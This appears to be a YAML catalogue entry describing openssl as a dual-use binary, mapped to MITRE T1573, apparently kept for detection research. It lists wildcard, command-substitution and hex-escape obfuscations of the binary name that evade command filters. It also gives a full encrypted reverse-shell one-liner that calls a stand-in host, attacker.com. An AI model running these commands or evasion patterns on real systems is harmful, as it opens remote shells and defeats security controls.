---
Name: openssl
Description: "Cryptography toolkit and TLS client. Can encrypt/decrypt data, create reverse shells over TLS, and act as a generic TCP client."
Platform: linux
BinaryPath:
  - /usr/bin/openssl
  - /bin/openssl
Category: encode-decode
MitreID: T1573
Patterns:
  - Pattern: "open*"
    Wildcards: ["*"]
    Notes: "Star matches 'ssl' — may match other 'open*' binaries in PATH"
  - Pattern: "openss?"
    Wildcards: ["?"]
    Notes: "Single wildcard replaces 'l'"
  - Pattern: "ope?ssl"
    Wildcards: ["?"]
    Notes: "Wildcard replaces 'n'"
  - Pattern: "o*ssl"
    Wildcards: ["*"]
    Notes: "Star matches 'pen'"
  - Pattern: "/usr/bin/openss?"
    Wildcards: ["?"]
    Notes: "Full path, wildcard on last char"
  - Pattern: "/???/bin/open*"
    Wildcards: ["?", "*"]
    Notes: "Mixed wildcards on path and command"
  - Pattern: "$(ls /usr/bin/openss?)"
    Wildcards: ["?"]
    Notes: "ls resolves glob to /usr/bin/openssl; command substitution executes it"
  - Pattern: "$'\\x6f\\x70\\x65\\x6e\\x73\\x73\\x6c'"
    Wildcards: []
    Notes: "ANSI-C hex escapes expand to 'openssl'"
PlatformNotes: |
  openssl can create encrypted reverse shells: `openssl s_client -connect attacker.com:443 | /bin/bash 2>&1 | openssl s_client -connect attacker.com:444`. The `enc` subcommand handles symmetric encryption. The `s_client` subcommand acts as a TLS-capable netcat.
Resources:
  - https://attack.mitre.org/techniques/T1573/
  - https://www.openssl.org/docs/man1.1.1/man1/openssl.html
---
